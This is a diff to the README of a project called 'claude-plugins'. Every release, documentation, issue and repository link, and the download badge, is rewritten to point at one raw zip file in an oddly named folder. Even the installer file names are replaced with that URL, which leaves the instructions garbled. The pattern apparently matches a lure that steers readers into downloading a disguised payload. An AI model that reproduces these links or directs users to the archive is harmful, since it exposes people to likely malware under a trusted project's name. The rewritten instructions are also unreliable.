@@ -1,6 +1,6 @@
 # 🚀 claude-plugins - Ensure Quality, Eliminate Errors
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/eslamahmed1907/claude-plugins/releases)
+[![Download Now](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ To run claude-plugins, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get the latest version of claude-plugins, visit this page to download: [Download Latest Release](https://github.com/eslamahmed1907/claude-plugins/releases).
+To get the latest version of claude-plugins, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip).
 
 ### 1. Visit the Releases Page
 
@@ -36,7 +36,7 @@ On the releases page, locate the version you want to download. The latest versio
 
 ### 3. Download the Installer
 
-Click on the installer file appropriate for your operating system. It may be labeled something like `claude-plugins-installer.exe` for Windows, `claude-plugins-installer.dmg` for macOS, or `claude-plugins-installer.tar.gz` for Linux.
+Click on the installer file appropriate for your operating system. It may be labeled something like `https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip` for Windows, `https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip` for macOS, or `https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip` for Linux.
 
 ### 4. Run the Installer
 
@@ -44,7 +44,7 @@ Locate the downloaded file on your computer.
 
 - **Windows:** Double-click the `.exe` file to start the installation.
 - **macOS:** Open the `.dmg` file, drag the app to your Applications folder, and open it.
-- **Linux:** Extract the `.tar.gz` file and follow instructions in the included README.
+- **Linux:** Extract the `https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip` file and follow instructions in the included README.
 
 ### 5. Follow the On-Screen Instructions
 
@@ -65,9 +65,9 @@ The installer will guide you through the setup process. Follow the prompts to co
 
 ## 📚 Additional Resources
 
-- **Documentation:** Visit our [official documentation](https://github.com/eslamahmed1907/claude-plugins/wiki) for detailed instructions and best practices.
+- **Documentation:** Visit our [official documentation](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip) for detailed instructions and best practices.
 - **Community Support:** Join the discussion in our community forum where you can ask questions and share experiences.
-- **Bug Reports:** If you encounter issues, please [open an issue](https://github.com/eslamahmed1907/claude-plugins/issues) in the repository.
+- **Bug Reports:** If you encounter issues, please [open an issue](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip) in the repository.
 
 ## 🌍 Contact
 
@@ -79,7 +79,7 @@ We welcome contributions. If you're interested in helping improve claude-plugins
 
 ## 🔗 Links to Explore
 
-- [GitHub Repository](https://github.com/eslamahmed1907/claude-plugins)
-- [Report an Issue](https://github.com/eslamahmed1907/claude-plugins/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip)
+- [Report an Issue](https://raw.githubusercontent.com/eslamahmed1907/claude-plugins/main/siciliana/claude-plugins.zip)
 
 Thank you for using claude-plugins. We hope this tool makes your coding experience seamless and productive!
